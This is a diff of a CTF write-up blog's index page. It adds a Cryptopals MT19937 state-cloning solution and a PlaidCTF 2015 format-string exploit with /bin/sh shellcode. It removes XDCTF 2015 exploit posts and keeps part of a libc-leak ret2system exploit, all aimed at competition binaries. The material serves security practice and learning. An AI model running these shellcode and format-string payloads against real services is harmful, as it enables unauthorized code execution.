@@ -204,6 +204,113 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Clone-an-MT19937-RNG-from-its-output" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/12/01/Clone-an-MT19937-RNG-from-its-output/" class="article-date">
+  	<time datetime="2015-12-01T03:01:50.000Z" itemprop="datePublished">2015-12-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/12/01/Clone-an-MT19937-RNG-from-its-output/">Clone_an_MT19937_RNG_from_its_output</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>Problem : <a href="http://cryptopals.com/sets/3/challenges/23/" target="_blank" rel="external">Clone_an_MT19937_RNG_from_its_output</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Written against python 3.3.1</span></span><br><span class="line"><span class="comment"># Matasano Problem 21,22</span></span><br><span class="line"><span class="comment"># Implement the MT19937 Mersenne Twister RNG</span></span><br><span class="line"><span class="comment"># generated from code on the wikipedia</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.MT = [<span class="number">0</span>] * <span class="number">624</span>;</span><br><span class="line">        self.index = <span class="number">0</span>;</span><br><span class="line">        self.seed = <span class="number">0</span>;</span><br><span class="line">        self.initialize_generator(seed);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize_generator</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        self.MT[<span class="number">0</span>] = seed;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">            self.MT[i] = <span class="number">0xffffffff</span> &amp; (<span class="number">0x6c078965</span> * (self.MT[i<span class="number">-1</span>] ^ (self.MT[i<span class="number">-1</span>] &gt;&gt; <span class="number">30</span>)) + i);</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_number</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (self.index == <span class="number">0</span>):</span><br><span class="line">            self.generate_numbers();</span><br><span class="line">            </span><br><span class="line">        y = self.MT[self.index];        </span><br><span class="line">        y = y ^ (y &gt;&gt; <span class="number">11</span>);</span><br><span class="line">        y = y ^ ((y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>);</span><br><span class="line">        y = y ^ ((y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>);</span><br><span class="line">        y = y ^ (y &gt;&gt; <span class="number">18</span>);</span><br><span class="line">        </span><br><span class="line">        self.index = (self.index+<span class="number">1</span>)%<span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_numbers</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            y = (self.MT[i] &amp; <span class="number">0x80000000</span>) + (self.MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">            self.MT[i] = self.MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ((y%<span class="number">2</span>) != <span class="number">0</span>):</span><br><span class="line">                self.MT[i] = self.MT[i] ^ <span class="number">0x9908b0df</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">temper</span><span class="params">(y)</span>:</span></span><br><span class="line">    y = y ^ (y &gt;&gt; <span class="number">11</span>);</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>);</span><br><span class="line">    y = y ^ ((y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>);</span><br><span class="line">    y = y ^ (y &gt;&gt; <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(y)</span>:</span></span><br><span class="line">    y3 = (y &amp; <span class="number">0xffffc000</span>);</span><br><span class="line">    y3 |= ((y &gt;&gt; <span class="number">18</span>) ^ (y&amp;<span class="number">0x3fff</span>));</span><br><span class="line">    y2 = (y3 &amp; <span class="number">0x1039ffff</span>);</span><br><span class="line">    y2 |= ((y3 ^ ((y2 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>)) &amp; <span class="number">0xfffe0000</span>);</span><br><span class="line">    y1 = y2 &amp; <span class="number">0x7f</span>;</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; (<span class="number">0x7f</span> &lt;&lt; <span class="number">7</span>));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; (<span class="number">0x7f</span> &lt;&lt; <span class="number">14</span>));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; (<span class="number">0x7f</span> &lt;&lt; <span class="number">21</span>));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ y2) &amp; <span class="number">0xf0000000</span>);</span><br><span class="line">    y0 = (y1 &amp; <span class="number">0xffe00000</span>);</span><br><span class="line">    y0 |= (((y0 &gt;&gt; <span class="number">11</span>) ^ y1) &amp; <span class="number">0x001ffc00</span>);</span><br><span class="line">    y0 |= (((y0 &gt;&gt; <span class="number">11</span>) ^ y1) &amp; <span class="number">0x3ff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y0;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cloneMT</span><span class="params">(dolly)</span>:</span></span><br><span class="line">    clone = MT19937(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">        clone.MT[i] = untemper(dolly.extract_number());</span><br><span class="line">    <span class="keyword">return</span> clone;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dolly = MT19937(<span class="number">8675309</span>);</span><br><span class="line">    clone = cloneMT(dolly);</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        print(dolly.extract_number(),clone.extract_number());</span><br><span class="line">    print(<span class="string">"Clone succeeded"</span>);</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-PlaidCTF-2015-Quals-ebp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/12/01/PlaidCTF-2015-Quals-ebp/" class="article-date">
+  	<time datetime="2015-12-01T02:44:58.000Z" itemprop="datePublished">2015-12-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/12/01/PlaidCTF-2015-Quals-ebp/">PlaidCTF-2015-Quals-ebp</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>Download: <a href="http://bigtang.org/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf">ebp_a96f7231ab81e1b0d7fe24d660def25a.elf</a></p>
+</blockquote>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>58<span class="tag">\<span class="name">x</span></span>99<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>2f"</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>54"</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>5b<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>53<span class="tag">\<span class="name">x</span></span>54<span class="tag">\<span class="name">x</span></span>59<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>34"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io = zio(('127.0.0.1',2333),timeout=2333)</span><br><span class="line">#raw_input()</span><br><span class="line">io.writeline("<span class="comment">%4$x")</span></span><br><span class="line">ebp = (int(io.read(8),16)-0x1c) &amp; 0xffff</span><br><span class="line">print "[+] Leaked Address: ", hex(ebp)</span><br><span class="line"></span><br><span class="line">io.writeline("<span class="comment">%"+str(ebp)+"x%4$hn")</span></span><br><span class="line">io.writeline(shellcode+"<span class="comment">%"+str(0xa480-len(shellcode))+"x%"+str(12)+"$hn")</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-RCTF-2015-Quals-pwn400" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -609,114 +716,6 @@
 <p>Download: <a href="http://bigtang.org/files/xd_jwxt">xd_jwxt</a></p>
 </blockquote>
 <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'192.168.1.104'</span></span><br><span class="line">port = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x3e360</span></span><br><span class="line">bin_sh = <span class="number">0x15d1a9</span></span><br><span class="line">puts_off = <span class="number">0x64d20</span></span><br><span class="line"></span><br><span class="line">login   = <span class="number">0x8048a0b</span></span><br><span class="line">put_plt = <span class="number">0x80485b0</span></span><br><span class="line">put_got = <span class="number">0x804a894</span></span><br><span class="line">bss	= <span class="number">0x804aa00</span></span><br><span class="line">target = (host,port)</span><br><span class="line"><span class="built_in">io</span> = zio(target)</span><br><span class="line">#raw_input()</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line"># leak libc base</span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'student_'</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += l32(bss)</span><br><span class="line">payload += l32(put_plt)</span><br><span class="line">payload += l32(login)</span><br><span class="line">payload += l32(put_got)</span><br><span class="line"><span class="built_in">io</span>.writeline(payload)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'000001'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'00\'\n'</span>)</span><br><span class="line">#<span class="built_in">io</span>.writeline(<span class="string">'1111'</span>)</span><br><span class="line">#<span class="built_in">io</span>.read_until(<span class="string">'\n'</span>)</span><br><span class="line">libc_base = l32(<span class="built_in">io</span>.read(<span class="number">4</span>)) - puts_off</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> hex(libc_base)</span><br><span class="line">#<span class="built_in">io</span>.interact()</span><br><span class="line">#<span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line">#<span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line"># ret to system</span><br><span class="line">payload  = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'student_'</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += l32(bss)</span><br><span class="line">payload += l32(libc_base + system)</span><br><span class="line">payload += l32(login)</span><br><span class="line">payload += l32(libc_base + bin_sh)</span><br><span class="line"><span class="built_in">io</span>.writeline(payload)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'000001'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'00\'\n'</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-XDCTF-2015-Finals-pwn-v0" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/19/XDCTF-2015-Finals-pwn-v0/" class="article-date">
-  	<time datetime="2015-10-19T08:59:10.000Z" itemprop="datePublished">2015-10-19</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/19/XDCTF-2015-Finals-pwn-v0/">XDCTF-2015-Finals-pwn-v0</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>Download: <a href="http://bigtang.org/files/xd_jwxt">xd_jwxt</a></p>
-</blockquote>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.1.104"</span></span><br><span class="line">port = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line">target = (host,port)</span><br><span class="line"><span class="built_in">io</span> = zio(target)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQkyHwhah0vk0QaxtoDorSCX1xDobB59rNlIXcHMOpAABigtang"</span></span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">':'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'31337'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'$ '</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(payload)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-XDCTF-2015-Quals-pwn400" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/03/XDCTF-2015-Quals-pwn400/" class="article-date">
-  	<time datetime="2015-10-03T08:58:36.000Z" itemprop="datePublished">2015-10-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/03/XDCTF-2015-Quals-pwn400/">XDCTF-2015-Quals-pwn400</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>Download: <a href="http://bigtang.org/files/pwn400-4f8994f7ed97f9ed4559cb83b56d4c86">pwn400-4f8994f7ed97f9ed4559cb83b56d4c86</a></p>
-</blockquote>
-<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">ip = '159.203.87.2'</span><br><span class="line">port = '8888'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">send_data = ("<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">x</span></span>4b<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>78<span class="tag">\<span class="name">x</span></span>3b<span class="tag">\<span class="name">x</span></span>46<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xcf</span></span>"</span><br><span class="line">"<span class="tag">\<span class="name">xd</span></span>0<span class="tag">\<span class="name">x</span></span>4a<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>32<span class="tag">\<span class="name">x</span></span>2e"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>78<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">x</span></span>4b<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>78<span class="tag">\<span class="name">x</span></span>3b<span class="tag">\<span class="name">x</span></span>46<span class="tag">\<span class="name">x</span></span>31<span class="tag">\<span class="name">xcf</span></span><span class="tag">\<span class="name">xd</span></span>0<span class="tag">\<span class="name">x</span></span>4a<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">x</span></span>24<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>32<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>78<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>18<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>06<span class="tag">\<span class="name">xad</span></span><span class="tag">\<span class="name">xec</span></span><span class="tag">\<span class="name">xfe</span></span><span class="tag">\<span class="name">x</span></span>39<span class="tag">\<span class="name">xd</span></span>0<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">xcd</span></span><span class="tag">\<span class="name">xc</span></span>3"</span><br><span class="line">"<span class="tag">\<span class="name">xe</span></span>7<span class="tag">\<span class="name">xfe</span></span><span class="tag">\<span class="name">x</span></span>39<span class="tag">\<span class="name">xd</span></span>0<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>2e<span class="tag">\<span class="name">xcd</span></span><span class="tag">\<span class="name">xc</span></span>3<span class="tag">\<span class="name">xe</span></span>7<span class="tag">\<span class="name">xfe</span></span><span class="tag">\<span class="name">x</span></span>39<span class="tag">\<span class="name">xd</span></span>0<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">x</span></span>4b<span class="tag">\<span class="name">x</span></span>05"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>06<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>57<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>26<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00"</span><br><span class="line">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00")</span><br><span class="line"></span><br><span class="line">s.connect((ip,int(port)))</span><br><span class="line">print("[-] Connecting to " + ip + " on port " + port + "<span class="tag">\<span class="name">n</span></span>")</span><br><span class="line">recv_data = s.recv(1024)</span><br><span class="line">print "[-] recv_data:<span class="tag">\<span class="name">n</span></span>",recv_data</span><br><span class="line"></span><br><span class="line">s.send(send_data)</span><br><span class="line">print "[-] send data:",send_data,len(send_data)</span><br><span class="line"></span><br><span class="line">recv_flag = s.recv(1024)</span><br><span class="line">print "[-] recv flag:",recv_flag</span><br><span class="line">s.close()</span><br><span class="line">print("[-] Sent successfully!")</span><br></pre></td></tr></table></figure>
-
       
     </div>
     
